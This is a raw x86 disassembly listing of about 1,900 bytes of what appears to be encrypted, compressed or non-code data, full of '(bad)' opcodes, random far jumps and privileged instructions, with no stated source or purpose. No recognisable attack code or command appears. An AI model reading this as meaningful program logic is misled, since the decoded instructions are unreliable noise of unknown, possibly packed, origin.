  412f90:	adc    eax,0xbee8426a
  412f95:	outs   dx,BYTE PTR ds:[esi]
  412f96:	adc    DWORD PTR [edi],ecx
  412f98:	les    esp,FWORD PTR fs:[edi-0x78]
  412f9c:	cmp    esp,DWORD PTR [esi-0x12dbcd86]
  412fa2:	sub    esi,DWORD PTR [ecx+0x13cd1f9f]
  412fa8:	fnstsw WORD PTR [ebx+0x42]
  412fab:	push   edi
  412fac:	addr16 std 
  412fae:	test   eax,0x8dd55e2c
  412fb3:	push   ecx
  412fb4:	ret    0xb28d
  412fb7:	pop    es
  412fb8:	xlat   BYTE PTR ds:[ebx]
  412fb9:	or     BYTE PTR [edi],dl
  412fbb:	ss xor dl,0xef
  412fbf:	mov    edi,0x9d7ee098
  412fc4:	push   ecx
  412fc5:	fsubr  DWORD PTR [edx]
  412fc7:	mov    dh,0xbf
  412fc9:	(bad)  
  412fca:	test   eax,0xe93fad99
  412fcf:	loopne 0x412f63
  412fd1:	mov    esi,0xe36abbfd
  412fd6:	fild   DWORD PTR [eax-0x72]
  412fd9:	push   edi
  412fda:	scas   al,BYTE PTR es:[edi]
  412fdb:	inc    ebp
  412fdc:	dec    eax
  412fdd:	mov    ecx,0x1a6cee96
  412fe2:	jmp    FWORD PTR [esi-0x20]
  412fe5:	shl    ah,0x34
  412fe8:	shl    BYTE PTR [ecx+eax*4-0xe],1
  412fec:	fimul  WORD PTR [edx-0x67]
  412fef:	fnstenv [ecx-0x3263d5f6]
  412ff5:	dec    eax
  412ff6:	sub    DWORD PTR [eax+ecx*4],esp
  412ff9:	es inc ecx
  412ffb:	loopne 0x413027
  412ffd:	xor    DWORD PTR [ebx+ebx*8-0x4c],ecx
  413001:	jg     0x412fc5
  413003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413004:	or     BYTE PTR [ebx-0x2e762436],bh
  41300a:	rcl    DWORD PTR [esi-0x4d723791],1
  413010:	(bad)  
  413011:	xlat   BYTE PTR ds:[ebx]
  413012:	add    al,0xf5
  413014:	mov    eax,0x8bf67ff
  413019:	cwde   
  41301a:	xchg   ebx,eax
  41301b:	and    DWORD PTR [ecx-0x74],0x11
  41301f:	(bad)
  413022:	loop   0x412fa4
  413024:	mov    ebx,0xee510741
  413029:	ds push ebx
  41302b:	jge    0x41308a
  41302d:	jle    0x413080
  41302f:	sub    ebx,DWORD PTR [ebx+0x31]
  413032:	retf   0x7b0e
  413035:	push   esp
  413036:	and    cl,BYTE PTR [edx+edi*1]
  413039:	and    edi,edx
  41303b:	fs fcmovbe st,st(2)
  41303e:	cmp    al,0xf5
  413040:	lea    esi,[ebx+eax*8]
  413043:	addr16 dec edi
  413045:	jne    0x413016
  413047:	inc    esp
  413048:	xchg   ebp,eax
  413049:	das    
  41304a:	inc    eax
  41304b:	push   esp
  41304c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41304d:	mov    dl,0xc
  41304f:	push   ecx
  413050:	addr16 mov ah,0x2a
  413053:	test   BYTE PTR [eax],ch
  413055:	inc    eax
  413056:	(bad)  
  413058:	and    BYTE PTR ds:0x2d8a7d3a,al
  41305e:	out    0x72,eax
  413060:	(bad)  
  413062:	cmp    DWORD PTR [edi-0x19],ebx
  413065:	and    ebp,esp
  413067:	sbb    ch,BYTE PTR ss:0xe14fb6a9
  41306e:	mov    eax,ds:0x350334d1
  413073:	pop    edx
  413074:	je     0x41309f
  413076:	fmul   QWORD PTR [ebp+0x488602bb]
  41307c:	retf   
  41307d:	jmp    0x86d07bd1
  413082:	pop    ecx
  413083:	pop    es
  413084:	stos   BYTE PTR es:[edi],al
  413085:	or     dl,BYTE PTR [esi+0x17c58859]
  41308b:	dec    ecx
  41308c:	mov    dh,0x44
  41308e:	ins    BYTE PTR es:[edi],dx
  41308f:	mov    al,ds:0x5c912738
  413094:	sub    DWORD PTR [edi-0x76564f77],eax
  41309a:	pushf  
  41309b:	sbb    al,0xbd
  41309d:	push   esp
  41309e:	dec    esp
  41309f:	aad    0xae
  4130a1:	jmp    0x413053
  4130a3:	dec    esp
  4130a4:	pusha  
  4130a5:	std    
  4130a6:	push   eax
  4130a7:	jg     0x4130e8
  4130a9:	mov    dl,0x7
  4130ab:	adc    esi,esp
  4130ad:	adc    DWORD PTR [eax+0x7331664a],esi
  4130b3:	daa    
  4130b4:	cmp    al,0x41
  4130b6:	inc    ecx
  4130b7:	xchg   esi,eax
  4130b8:	push   0xffffff95
  4130ba:	jl     0x413098
  4130bc:	ins    BYTE PTR es:[edi],dx
  4130bd:	sub    edi,edx
  4130bf:	retf   
  4130c0:	(bad)  
  4130c1:	out    dx,eax
  4130c2:	clc    
  4130c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130c4:	(bad)  
  4130c5:	jmp    0x662b:0xda00fae5
  4130cc:	sub    al,0x19
  4130ce:	out    dx,eax
  4130cf:	and    al,0x6a
  4130d1:	imul   esi,ebx,0xa68f6f9
  4130d7:	mov    ah,0x9b
  4130d9:	les    esi,FWORD PTR [ecx]
  4130db:	jo     0x41311a
  4130dd:	ret    0x2804
  4130e0:	outs   dx,BYTE PTR ds:[esi]
  4130e1:	(bad)  
  4130e3:	std    
  4130e4:	mov    fs,WORD PTR [edx+edx*1]
  4130e7:	(bad)  
  4130e9:	mov    eax,0x62b6db33
  4130ee:	scas   eax,DWORD PTR es:[edi]
  4130ef:	call   DWORD PTR [edx]
  4130f1:	add    eax,0xe5a9aaa9
  4130f6:	rcl    BYTE PTR [esi+esi*1],0x45
  4130fa:	nop
  4130fb:	push   esp
  4130fc:	data16 mov dh,0xe9
  4130ff:	or     bl,BYTE PTR [edx+0x4c]
  413102:	stos   BYTE PTR es:[edi],al
  413103:	push   es
  413104:	mov    ch,0xcb
  413106:	imul   ebx,edi,0x2a
  413109:	and    dh,ah
  41310b:	xchg   ebx,eax
  41310c:	jo     0x413162
  41310e:	aad    0xa
  413110:	fdivr  QWORD PTR [ebp-0x60]
  413113:	mov    dh,0x90
  413115:	ret    0x33ae
  413118:	int    0x65
  41311a:	sbb    bl,al
  41311c:	inc    esp
  41311d:	sbb    al,0x61
  41311f:	ret    0x2aa1
  413122:	sub    al,0xfa
  413124:	mov    eax,ds:0x920754fb
  413129:	inc    ecx
  41312a:	fisub  WORD PTR [ebx-0x1f]
  41312d:	int3   
  41312e:	mov    esp,0xaa70ef54
  413133:	sbb    DWORD PTR [edi+0x10bdeaab],edx
  413139:	ret    0x9271
  41313c:	sub    ah,dh
  41313e:	push   es
  41313f:	sub    DWORD PTR [esi+0x3e792918],0xfffffff1
  413146:	sahf   
  413147:	repnz stos DWORD PTR es:[edi],eax
  413149:	retf   
  41314a:	gs out dx,eax
  41314c:	push   0x69
  41314e:	and    DWORD PTR [ecx+0x7],eax
  413151:	fsubr  st(7),st
  413153:	les    esi,FWORD PTR [ebx+0x37]
  413156:	nop
  413157:	leave  
  413158:	sti    
  413159:	lahf   
  41315a:	jp     0x4131a2
  41315c:	pop    ebx
  41315d:	rol    BYTE PTR [ebx],0x45
  413160:	mov    al,ds:0x643c78c
  413165:	inc    edx
  413166:	rcl    BYTE PTR [ebx-0x7abb4310],0x44
  41316d:	inc    esi
  41316e:	in     ax,0xcc
  413171:	mov    edi,0x65ffe186
  413176:	(bad)  
  413177:	not    BYTE PTR [esi-0x78]
  41317a:	mov    BYTE PTR [ecx-0x14],0x5f
  41317e:	pop    ecx
  41317f:	or     eax,0xb7744908
  413184:	iret   
  413185:	rcr    DWORD PTR [esi-0x7f],1
  413188:	test   BYTE PTR [ebx-0x3a79cf57],cl
  41318e:	sahf   
  41318f:	lods   al,BYTE PTR ds:[esi]
  413190:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413191:	dec    edx
  413192:	cld    
  413193:	mov    edx,0xe2580046
  413198:	xchg   esi,eax
  413199:	cmp    DWORD PTR [edi-0x35beade3],ecx
  41319f:	adc    BYTE PTR [ebp+0x68],0x70
  4131a3:	xor    DWORD PTR [edx-0x28],edi
  4131a6:	and    BYTE PTR ds:0xca18bd4d,al
  4131ac:	jnp    0x4131fc
  4131ae:	je     0x4131a3
  4131b0:	int    0x27
  4131b2:	shl    BYTE PTR [ecx-0x79eec637],cl
  4131b8:	into   
  4131b9:	pop    ebp
  4131ba:	inc    ecx
  4131bb:	lods   al,BYTE PTR ds:[esi]
  4131bc:	cdq    
  4131bd:	scas   eax,DWORD PTR es:[edi]
  4131be:	addr16 dec esp
  4131c0:	ins    DWORD PTR es:[edi],dx
  4131c1:	test   BYTE PTR [esi+0x237fd542],bl
  4131c7:	sub    DWORD PTR [ecx-0x1d8ec142],edi
  4131cd:	data16 xor dl,bh
  4131d0:	mov    ah,0xeb
  4131d2:	mov    dh,0xe0
  4131d4:	fucom  st(0)
  4131d6:	mov    esp,0x2949c2b7
  4131db:	cwde   
  4131dc:	or     ebp,DWORD PTR [eax-0x77]
  4131df:	cld    
  4131e0:	or     BYTE PTR [eax+0x55c086f],0x99
  4131e7:	imul   esi,DWORD PTR [ebx+0x11],0x75efeab9
  4131ee:	stos   BYTE PTR es:[edi],al
  4131ef:	mov    cs,ebp
  4131f1:	aaa    
  4131f2:	jnp    0x41319c
  4131f4:	adc    BYTE PTR [edx-0x36bd72af],bl
  4131fa:	push   edi
  4131fb:	in     al,0x24
  4131fd:	mov    ds:0xa5c7b090,al
  413202:	adc    BYTE PTR [eax+0x3acbafce],ch
  413208:	(bad)  
  413209:	push   ds
  41320a:	inc    edx
  41320b:	stc    
  41320c:	sahf   
  41320d:	push   es
  41320e:	ins    BYTE PTR es:[edi],dx
  41320f:	jb     0x413202
  413211:	cs push edi
  413213:	ficomp WORD PTR [eax+edx*4-0x685e946c]
  41321a:	popa   
  41321b:	mov    ds:0xc684f55f,al
  413220:	add    esp,DWORD PTR [esi-0x7e78f61]
  413226:	mov    bh,0x12
  413228:	call   0x6edc:0x95956504
  41322f:	pop    esi
  413230:	sbb    esp,DWORD PTR [edx]
  413232:	mov    al,ds:0xbd6e3d50
  413237:	mov    bl,0xbf
  413239:	push   esi
  41323a:	pop    esi
  41323b:	ins    DWORD PTR es:[edi],dx
  41323c:	ss jl  0x4131fe
  41323f:	mov    ch,0x8a
  413241:	stos   BYTE PTR es:[edi],al
  413242:	and    eax,0x221af179
  413247:	mov    edx,0x903001fc
  41324c:	test   DWORD PTR [ebp-0x64da9ec3],ecx
  413252:	ret    0x29f1
  413255:	rcr    BYTE PTR ds:0xff8cd6c1,cl
  41325b:	jns    0x41323f
  41325d:	lock jbe 0x413204
  413260:	adc    eax,0xc58d5af3
  413265:	add    DWORD PTR [eax+eiz*2-0x7557b380],ebx
  41326c:	loope  0x413204
  41326e:	xor    DWORD PTR [edi-0x4c],edi
  413271:	fisttp WORD PTR [esi]
  413273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413274:	jl     0x413295
  413276:	mov    al,ds:0x67ced7fe
  41327b:	rcl    BYTE PTR [eax-0x5],0x0
  41327f:	lods   eax,DWORD PTR ds:[esi]
  413280:	inc    ebp
  413281:	or     esp,DWORD PTR [esp+ecx*2-0x14]
  413285:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413286:	cmp    eax,0xd5bac30
  41328b:	xor    ebp,edi
  41328d:	push   edx
  41328e:	cmp    al,0xc8
  413290:	lds    edx,FWORD PTR [ebx-0x79]
  413293:	fs aad 0x8f
  413296:	mov    dl,0xc2
  413298:	jg     0x4132e8
  41329a:	lahf   
  41329b:	mov    ah,0xe9
  41329d:	jno    0x4132ab
  41329f:	adc    ch,bl
  4132a1:	outs   dx,DWORD PTR ds:[esi]
  4132a2:	add    edi,DWORD PTR [ecx-0x3d847258]
  4132a8:	(bad)  
  4132a9:	clc    
  4132aa:	andnps xmm0,xmm1
  4132ad:	mov    esp,0x91cb7f79
  4132b2:	pop    es
  4132b3:	ret    0xe707
  4132b6:	bound  esi,QWORD PTR [ecx]
  4132b8:	fiadd  WORD PTR [edx+ebx*8]
  4132bb:	cli    
  4132bc:	jge    0x413297
  4132be:	mov    ebp,0xe7219b50
  4132c3:	xchg   DWORD PTR gs:[ebx],esi
  4132c6:	adc    edi,esp
  4132c8:	(bad)  
  4132c9:	jmp    0x3c2a:0x1e5bfe4f
  4132d0:	pushf  
  4132d1:	pusha  
  4132d2:	gs out 0x49,eax
  4132d5:	cmp    eax,0x1f3e5e1b
  4132da:	inc    eax
  4132db:	xor    cl,BYTE PTR ss:[ebp-0x10]
  4132df:	dec    ebx
  4132e0:	push   ds
  4132e1:	repz and eax,0xafae49bf
  4132e7:	sbb    DWORD PTR [eax+0xc54e4ae],esp
  4132ed:	data16 stos BYTE PTR es:[edi],al
  4132ef:	jnp    0x41334d
  4132f1:	sar    BYTE PTR [edi+0x6ad32b4e],0xd5
  4132f8:	(bad)  
  4132f9:	mov    dl,BYTE PTR [ebx+0x10]
  4132fc:	cmp    al,0xa3
  4132fe:	jo     0x4132c1
  413300:	cmc    
  413301:	push   ebx
  413302:	push   eax
  413303:	add    ecx,DWORD PTR [ebp+esi*1+0x7]
  413307:	cmp    eax,ecx
  413309:	in     al,0xbf
  41330b:	shl    BYTE PTR [ecx],1
  41330d:	xor    dh,BYTE PTR [ecx]
  41330f:	dec    edi
  413310:	inc    ebp
  413311:	loop   0x413386
  413313:	sbb    edi,DWORD PTR [edx]
  413315:	jge    0x41333b
  413317:	hlt    
  413318:	sbb    esp,ebx
  41331a:	mov    dl,0x6e
  41331c:	and    eax,0x521316fa
  413321:	data16 data16 cmc 
  413324:	out    dx,al
  413325:	je     0x413362
  413327:	inc    edx
  413328:	es sti 
  41332a:	out    dx,eax
  41332b:	(bad)  
  41332c:	sbb    al,0xf4
  41332e:	push   ebp
  41332f:	shl    DWORD PTR [ebx-0x26],1
  413332:	mov    ds:0x811a6b88,al
  413337:	hlt    
  413338:	inc    esi
  413339:	stos   BYTE PTR es:[edi],al
  41333a:	nop
  41333b:	cmp    cl,BYTE PTR [esi-0x43]
  41333e:	cmp    esi,esi
  413340:	stos   DWORD PTR es:[edi],eax
  413341:	sub    BYTE PTR es:[ecx],dl
  413344:	dec    eax
  413345:	imul   ecx,DWORD PTR [esi+esi*8+0x63005af],0xffffffa1
  41334d:	mov    ch,0x46
  41334f:	xor    dh,BYTE PTR [ebx+0x74]
  413352:	xchg   esp,eax
  413353:	das    
  413354:	and    esi,ecx
  413356:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413357:	inc    esp
  413358:	jns    0x4132e2
  41335a:	inc    ebx
  41335b:	sbb    ecx,eax
  41335d:	cld    
  41335e:	cmp    eax,DWORD PTR [ebx-0x47]
  413361:	loopne 0x4133c9
  413363:	sbb    al,0x18
  413365:	or     edi,DWORD PTR [edi]
  413367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413368:	mov    bl,0x0
  41336a:	push   ss
  41336b:	xor    al,0xb5
  41336d:	addr16 xor eax,0x2e33a050
  413373:	pop    ds
  413374:	or     eax,0x20fd5976
  413379:	stos   DWORD PTR es:[edi],eax
  41337a:	js     0x41334c
  41337c:	and    al,0x99
  41337e:	sub    DWORD PTR [edi-0x390ab686],0x535d2357
  413388:	shr    bl,0x8d
  41338b:	or     eax,0x35142bd
  413390:	push   eax
  413391:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413392:	mov    ah,0x39
  413394:	aad    0xf8
  413396:	and    al,0x59
  413398:	mov    al,ds:0xe62aec9
  41339d:	jmp    0x4133d5
  41339f:	inc    esi
  4133a0:	cld    
  4133a1:	aad    0xc9
  4133a3:	out    0xb6,eax
  4133a5:	mov    ebp,0x3edbe99a
  4133aa:	dec    edx
  4133ab:	popa   
  4133ac:	scas   eax,DWORD PTR es:[edi]
  4133ad:	loope  0x4133e8
  4133af:	jmp    0x4133bf
  4133b1:	dec    edi
  4133b2:	adc    DWORD PTR ss:[esi],esp
  4133b5:	or     BYTE PTR [eax-0x3c],dl
  4133b8:	pop    ds
  4133b9:	sub    esi,DWORD PTR [esi+0x784ff5c9]
  4133bf:	stc    
  4133c0:	push   ecx
  4133c1:	imul   edx,DWORD PTR [ebx+0x1a7492de],0x74
  4133c8:	jne    0x41343b
  4133ca:	popf   
  4133cb:	adc    dh,dl
  4133cd:	and    ebp,DWORD PTR [ebp-0x9]
  4133d0:	sbb    eax,0xc967442a
  4133d5:	jg     0x4133d8
  4133d7:	aas    
  4133d8:	imul   ebp,DWORD PTR [ebp-0x60326a38],0xffffffd1
  4133df:	(bad)  
  4133e0:	stos   DWORD PTR es:[edi],eax
  4133e1:	add    eax,0xbe6717e1
  4133e6:	mov    ch,0x6
  4133e8:	clc    
  4133e9:	jbe    0x413454
  4133eb:	cmp    edi,DWORD PTR gs:[edx]
  4133ee:	(bad)  
  4133f0:	mov    bl,0xb1
  4133f2:	mov    edx,0x60d7663e
  4133f7:	lds    esp,FWORD PTR [ebp-0x47d26aff]
  4133fd:	mov    esi,0x72ee74a3
  413402:	(bad)  
  413403:	jg     0x4133c1
  413405:	loopne 0x413390
  413407:	mov    esi,0xf0d32ada
  41340c:	popf   
  41340d:	ins    BYTE PTR es:[edi],dx
  41340e:	shr    BYTE PTR [esi],cl
  413410:	inc    esi
  413411:	push   ds
  413412:	daa    
  413413:	nop
  413414:	push   ss
  413415:	cmc    
  413416:	je     0x413460
  413418:	xchg   edi,eax
  413419:	fisubr WORD PTR [edx-0x17]
  41341c:	push   cs
  41341d:	lahf   
  41341e:	and    al,0x3d
  413420:	test   BYTE PTR [ebx+ebp*1+0x29],dh
  413424:	test   DWORD PTR [ebx+0x41],ebp
  413427:	and    edi,DWORD PTR [edx]
  413429:	xor    bh,cl
  41342b:	sbb    eax,0x16d264c6
  413430:	mov    cl,0x31
  413432:	push   esp
  413433:	(bad)  
  413434:	int3   
  413435:	pushf  
  413436:	es and eax,0xc4ce3f6a
  41343c:	out    dx,eax
  41343d:	sub    ah,0xe1
  413440:	mov    al,ds:0xf2acbbac
  413445:	add    al,0x8b
  413447:	mov    WORD PTR [edx-0x7b],?
  41344a:	retf   0xcf4f
  41344d:	mov    edx,0x245c55f6
  413452:	scas   al,BYTE PTR es:[edi]
  413453:	mov    ch,0xa
  413455:	xor    BYTE PTR [ecx+0x24],ah
  413458:	fisttp DWORD PTR [ecx+ebp*4]
  41345b:	int    0x6d
  41345d:	aaa    
  41345e:	xchg   edx,eax
  41345f:	ret    
  413460:	and    eax,0x69dd8b26
  413465:	xor    BYTE PTR [eax],bh
  413467:	scas   al,BYTE PTR es:[edi]
  413468:	push   ebp
  413469:	shl    DWORD PTR [edi],1
  41346b:	xlat   BYTE PTR ds:[ebx]
  41346c:	dec    edx
  41346d:	test   al,0xe2
  41346f:	xlat   BYTE PTR ds:[ebx]
  413470:	pop    es
  413471:	ret    
  413472:	xor    bh,ch
  413474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413475:	ins    DWORD PTR es:[edi],dx
  413476:	mov    eax,ds:0x5de25f4
  41347b:	shl    DWORD PTR [ecx+0x76b00944],0x3f
  413482:	push   ebp
  413483:	nop
  413484:	pop    ss
  413485:	push   ss
  413486:	push   ds
  413487:	ror    DWORD PTR [esi],1
  413489:	ss je  0x4134a2
  41348c:	inc    eax
  41348d:	iret   
  41348e:	push   eax
  41348f:	jno    0x413506
  413491:	sub    eax,0xdd6c9096
  413496:	mov    bh,0xbb
  413498:	add    al,0xb1
  41349a:	das    
  41349b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41349c:	adc    eax,0x4111610b
  4134a1:	pop    es
  4134a2:	push   bx
  4134a4:	mov    WORD PTR [ebx-0x4cda51c],gs
  4134aa:	cwde   
  4134ab:	mov    DWORD PTR [ebx+0x37],ecx
  4134ae:	add    edi,0x7a
  4134b1:	call   0x3dc676dd
  4134b6:	lds    esi,FWORD PTR [eax]
  4134b8:	sub    ebx,edi
  4134ba:	pop    esp
  4134bb:	shr    al,1
  4134bd:	and    edx,DWORD PTR ds:0xde2272d0
  4134c3:	mov    edi,0x8e6fa344
  4134c8:	outs   dx,BYTE PTR ds:[esi]
  4134c9:	dec    ebx
  4134ca:	inc    esi
  4134cb:	gs daa 
  4134cd:	lds    eax,FWORD PTR [ebp+0x23]
  4134d0:	popf   
  4134d1:	ss sahf 
  4134d3:	call   0x6e71757f
  4134d8:	inc    ebp
  4134d9:	adc    cl,dl
  4134db:	push   esi
  4134dc:	cmp    eax,0x9c6bdd23
  4134e1:	fst    DWORD PTR [edi]
  4134e3:	fistp  DWORD PTR [eax-0x13399497]
  4134e9:	jge    0x4134a7
  4134eb:	dec    ebp
  4134ec:	mov    cs,ebp
  4134ee:	and    al,BYTE PTR [ecx]
  4134f0:	inc    ebp
  4134f1:	int3   
  4134f2:	(bad)  
  4134f3:	cld    
  4134f4:	pop    ebx
  4134f5:	outs   dx,DWORD PTR ds:[esi]
  4134f6:	sub    BYTE PTR [esi],0xd8
  4134f9:	xlat   BYTE PTR ds:[ebx]
  4134fa:	xor    al,0x9c
  4134fc:	loope  0x413554
  4134fe:	pushf  
  4134ff:	lahf   
  413500:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413501:	gs in  al,dx
  413503:	data16 lahf 
  413505:	cmp    BYTE PTR [ecx-0x69b3953c],dl
  41350b:	jae    0x413549
  41350d:	pop    esp
  41350e:	push   cs
  41350f:	je     0x413511
  413511:	lea    ecx,[ebx-0x4eb0f8a]
  413517:	icebp  
  413518:	cmp    al,0x53
  41351a:	arpl   WORD PTR ds:0x3f3d01bf,dx
  413520:	mov    al,0xa7
  413522:	out    0x27,eax
  413524:	mov    cs,WORD PTR [esi+ecx*8-0x4d959b7f]
  41352b:	xor    ah,dh
  41352d:	je     0x4134b6
  41352f:	sbb    al,0x90
  413531:	xchg   ecx,eax
  413532:	data16 in al,dx
  413534:	add    al,0x2f
  413536:	dec    eax
  413537:	pop    edi
  413538:	je     0x41354e
  41353a:	punpcklbw mm5,mm0
  41353d:	sub    ch,BYTE PTR [eax+0x26]
  413540:	push   ss
  413541:	jecxz  0x413520
  413543:	fild   QWORD PTR [ebp-0x64]
  413546:	or     eax,0xf034be91
  41354b:	sub    eax,0x3adcc571
  413550:	pushf  
  413551:	jae    0x4135a0
  413553:	out    dx,eax
  413554:	fcomip st,st(0)
  413556:	scas   al,BYTE PTR es:[edi]
  413557:	pop    esi
  413558:	mov    ah,0x45
  41355a:	push   ebp
  41355b:	sahf   
  41355c:	inc    esi
  41355d:	cmp    eax,ebp
  41355f:	and    BYTE PTR [edx-0x78],bh
  413562:	adc    BYTE PTR [edi+edi*4+0x60],cl
  413566:	mov    al,0xe1
  413568:	mov    ds:0x44a9e992,eax
  41356d:	sub    BYTE PTR [ebx],bl
  41356f:	add    eax,0xf93765f5
  413574:	adc    edx,esp
  413576:	adc    dl,BYTE PTR [esi+0x0]
  413579:	sahf   
  41357a:	dec    esp
  41357b:	cmp    bl,BYTE PTR [edx]
  41357d:	repz jnp 0x4135c8
  413580:	(bad)  
  413581:	pop    ss
  413582:	into   
  413583:	clc    
  413584:	mov    es,WORD PTR [ebx+0x49cadc70]
  41358a:	add    eax,0x3a592bde
  41358f:	loopne 0x4135d9
  413591:	les    edx,FWORD PTR ds:0x2d9ffced
  413597:	jmp    0xf0de:0xd63186a3
  41359e:	jo     0x41355f
  4135a0:	sub    BYTE PTR [esi+0x11],dh
  4135a3:	std    
  4135a4:	mov    al,ds:0x95264c89
  4135a9:	jle    0x413597
  4135ab:	pushf  
  4135ac:	add    dh,ch
  4135ae:	adc    eax,0xa71e7e08
  4135b3:	or     eax,DWORD PTR [edi+0x5a]
  4135b6:	js     0x4135d2
  4135b8:	dec    esi
  4135b9:	mov    ebx,0x1dc5d037
  4135be:	xor    al,0xc2
  4135c0:	dec    eax
  4135c1:	into   
  4135c2:	in     al,0xa8
  4135c4:	adc    eax,0x30a4afc1
  4135c9:	push   esp
  4135ca:	retf   
  4135cb:	inc    eax
  4135cc:	fsub   QWORD PTR [eax+0x48]
  4135cf:	repnz fnstsw WORD PTR [edi]
  4135d2:	jne    0x413606
  4135d4:	sub    edx,0xb1dd371a
  4135da:	aam    0x82
  4135dc:	pushf  
  4135dd:	lds    edx,FWORD PTR [eax+0x62]
  4135e0:	push   es
  4135e1:	xor    eax,0x7abd16c4
  4135e6:	or     BYTE PTR [edi],bh
  4135e8:	jecxz  0x4135b5
  4135ea:	test   ah,0x15
  4135ed:	xchg   esi,eax
  4135ee:	jb     0x4135a8
  4135f0:	iret   
  4135f1:	mov    dh,0x3c
  4135f3:	es out dx,eax
  4135f5:	pushf  
  4135f6:	outs   dx,DWORD PTR ds:[esi]
  4135f7:	cdq    
  4135f8:	add    al,0x14
  4135fa:	jo     0x413628
  4135fc:	test   DWORD PTR [ecx-0x2466c216],eax
  413602:	das    
  413603:	xchg   esp,eax
  413604:	fneni(8087 only) 
  413606:	data16 shr BYTE PTR [edx+0x4c],1
  41360a:	test   BYTE PTR ds:0x828416cd,bh
  413610:	push   edx
  413611:	(bad)  
  413612:	or     ebp,esp
  413614:	ins    BYTE PTR es:[edi],dx
  413615:	rol    DWORD PTR [esi],1
  413617:	loop   0x4135aa
  413619:	pop    esi
  41361a:	retf   0xb443
  41361d:	push   cs
  41361e:	pusha  
  41361f:	fnstenv [edx-0x6]
  413622:	xchg   esp,eax
  413623:	pop    ds
  413624:	ins    BYTE PTR es:[edi],dx
  413625:	imul   edx,DWORD PTR [esi+0x4f6f74f3],0xdadb6502
  41362f:	inc    eax
  413630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413631:	mov    ecx,0xea5c0a0b
  413636:	inc    ebx
  413637:	mov    es,WORD PTR [edi]
  413639:	xor    BYTE PTR [esi+eiz*1],ah
  41363c:	sbb    DWORD PTR [edx],ecx
  41363e:	pushf  
  41363f:	out    0x33,al
  413641:	fcmovnbe st,st(2)
  413643:	mov    BYTE PTR [ecx],ah
  413645:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413646:	sbb    eax,0x2dcfe32f
  41364b:	xlat   BYTE PTR ds:[ebx]
  41364c:	push   cs
  41364d:	inc    esi
  41364e:	(bad)  
  41364f:	rcr    BYTE PTR [edi],cl
  413651:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413652:	fdivr  st,st(7)
  413654:	add    BYTE PTR [ebx],ch
  413656:	sahf   
  413657:	dec    ebp
  413658:	repz adc al,0x94
  41365b:	add    edi,ecx
  41365d:	leave  
  41365e:	push   ss
  41365f:	pop    esp
  413660:	ret    
  413661:	stc    
  413662:	mov    edi,0x33620d3f
  413667:	xchg   esi,eax
  413668:	test   DWORD PTR [ebp-0x456af2cf],ecx
  41366e:	push   ds
  41366f:	inc    ecx
  413670:	loop   0x413645
  413672:	loopne 0x41360f
  413674:	sbb    esp,ebx
  413676:	into   
  413677:	inc    esi
  413678:	retf   
  413679:	xor    ebx,esi
  41367b:	add    bh,BYTE PTR [eax+ebp*1]
  41367e:	inc    edx
  41367f:	repz inc sp
  413682:	ins    BYTE PTR es:[edi],dx
  413683:	rcl    BYTE PTR [ebp-0xe8c8b0],0xcf
  41368a:	in     al,0x42
  41368c:	mov    edi,0xa58d31b0
  413691:	ds dec esp
  413693:	add    bh,cl
  413695:	in     al,0x68
  413697:	mov    dh,BYTE PTR [ecx]
  413699:	stc    
  41369a:	ja     0x413671
  41369c:	inc    edi
  41369d:	sbb    cl,bl
  41369f:	in     al,dx
  4136a0:	and    BYTE PTR [edi-0xcbf60af],bh
  4136a6:	jnp    0x41367c
  4136a8:	ret    
  4136a9:	sbb    eax,0x70cc13e1
  4136ae:	jbe    0x413706
  4136b0:	bound  edx,QWORD PTR [edi]
  4136b2:	and    bl,al
  4136b4:	lock sbb al,0x1f
  4136b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136b8:	aaa    
  4136b9:	mov    ebp,0x24cd4a9d
  4136be:	cmc    
  4136bf:	ret    0x7cec
  4136c2:	mov    esp,0x807e8ced
  4136c7:	push   ebp
  4136c8:	mov    eax,0x1b507ff8
  4136cd:	sar    edi,0xee
  4136d0:	ficomp DWORD PTR [edx+0x3f]
  4136d3:	retf   
  4136d4:	jg     0x4136f9
  4136d6:	mov    cl,0xd4
  4136d8:	push   ecx
  4136d9:	lock jg 0x413663
  4136dc:	std    
  4136dd:	addr16 retf 0x1d24
  4136e1:	dec    eax
  4136e2:	or     BYTE PTR [eax+0x31],al
  4136e5:	jnp    0x413738
  4136e7:	std    
  4136e8:	sahf   
  4136e9:	pop    esp
  4136ea:	test   ebp,ebx
  4136ec:	stos   BYTE PTR es:[edi],al
  4136ed:	and    edx,DWORD PTR gs:[ebp-0x5e]
  4136f1:	jmp    0x206b:0xce04123d
  4136f8:	cwde   
  4136f9:	sub    DWORD PTR [ebp-0x37],0xc484f299
  413700:	push   ss
  413701:	fidiv  DWORD PTR [esp+edi*2-0x6a]
  413705:	rcl    dl,0xf2
  413708:	test   BYTE PTR ds:0xca66fc06,0xb8
  41370f:	gs repnz (bad) 
  413712:	push   cs
  413713:	adc    eax,0x13158158
  413718:	ins    BYTE PTR es:[edi],dx
  413719:	push   esp
  41371a:	or     eax,0xdb07154
  41371f:	jbe    0x413715
  413721:	mov    edi,0xc8e64ab8
  413726:	pop    esi
  413727:	int    0xff
  413729:	cmp    ebx,DWORD PTR [eax+ebp*4]
  41372c:	lahf   
  41372d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41372e:	fst    QWORD PTR [ecx-0x3199f80a]
  413734:	ret    
  413735:	imul   ebp,ecx,0x83035be4
  41373b:	in     al,0xc1
  41373d:	dec    ebp
  41373e:	or     esp,DWORD PTR [ebx]
  413740:	in     al,dx
